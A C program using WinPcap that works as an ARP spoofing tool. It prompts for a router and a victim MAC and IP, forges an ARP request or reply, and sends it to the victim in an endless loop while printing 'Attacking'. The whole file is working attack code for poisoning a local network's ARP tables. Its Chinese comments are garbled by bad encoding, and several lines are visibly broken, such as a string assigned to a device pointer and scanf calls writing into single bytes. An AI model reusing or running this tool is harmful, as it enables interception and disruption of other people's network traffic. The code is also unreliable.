#include <stdlib.h>
#include <stdio.h>
#include <pcap.h>
#include <libnet.h>

int main(int argc, char **argv)
{
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[100];
    int j;

    pcap_if_t *alldevs;
    pcap_if_t *d;
    int inum;
    int i=0,m,n;

    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }
    
    /* ��ӡ�б� */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }
    
    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }
    
    printf("Enter the interface number (1-%d):",i);
    scanf("%d", &inum);
    
    if(inum < 1 || inum > i)
    {
        printf("\nInterface number out of range.\n");
        /* �ͷ��豸�б� */
        pcap_freealldevs(alldevs);
        return -1;
    }


	/* ��ת��ѡ�е������� */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

    
    /* ������豸 */
    if ( (fp= pcap_open(d=d->name,            // �豸��
                        100,                
                        PCAP_OPENFLAG_PROMISCUOUS,  
                        1000,               
                        NULL,               
                        errbuf              
                        ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
        return;
    }
	printf("**********������ARP����ѧϰ���Թ���************\n");

	/* Ŀ�ĵ�ַ��MAC��ַ*/
	printf("������·������MAC��ַ����FF:FF:FF:FF:FF:FF��\n");
	scanf("%2x:%2x:%2x:%2x:%2x:%2x",&packet[0],&packet[1],&packet[2],&packet[3],&packet[4],&packet[5]);

    

	/* ����MACԴ��ַ */
	printf("�����뱻������ip��MAC��ַ����FF:FF:FF:FF:FF:FF��\n");
	scanf("%2x:%2x:%2x:%2x:%2x:%2x",&packet[6],&packet[7],&packet[8],&packet[9],&packet[10],&packet[11]);
    
 
/* ֡����  */


	packet[12]=0x08;
    packet[13]=0x06;

	/* Ӳ������  */
	packet[14]=0x00;
    packet[15]=0x01;

	/* Э������ */
	packet[16]=0x08;
    packet[17]=0x00;
	/* op */
	packet[18]=0x06;
    packet[19]=0x04;
    /*  ARP�ʴ�Э��    */
	packet[20]=0x00;
	printf("��ѡ��Э������  1��ѯ��   2��Ӧ��(����) \n ");
	scanf("%2x",&packet[21]);
   // packet[21]=0x02;



	for(i=22;i<28;i++)
		packet[i]=packet[i-16];



	printf("�����뱻�����ߵ�ip��ַ\n");
	scanf("%d.%d.%d.%d",&packet[28],&packet[29],&packet[30],&packet[31]);



	for(i=32;i<38;i++)
		packet[i]=packet[i-32];





	printf("������·������ip��ַ\n");
	scanf("%d.%d.%d.%d",&packet[38],&packet[39],&packet[40],&packet[41]);



	for(j=42;j<60;j++)
	{
		packet[j]=0x00;
	}

	printf("Attacking %d.%d.%d.%d !",packet[28],packet[29],packet[30],packet[31]);

	
	
    while(1)
	{
	pcap_sendpacket(fp, packet, 60 /* size */);
	for(j=1000;j>0;j--)
		for(m=100;m>0;m--)
			for(n=300;n>0;n--);
	}

    /* �������ݰ� */
    if (pcap_sendpacket(fp, packet, 60 /* size */) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
  
    }
	
	

    return 0;
}

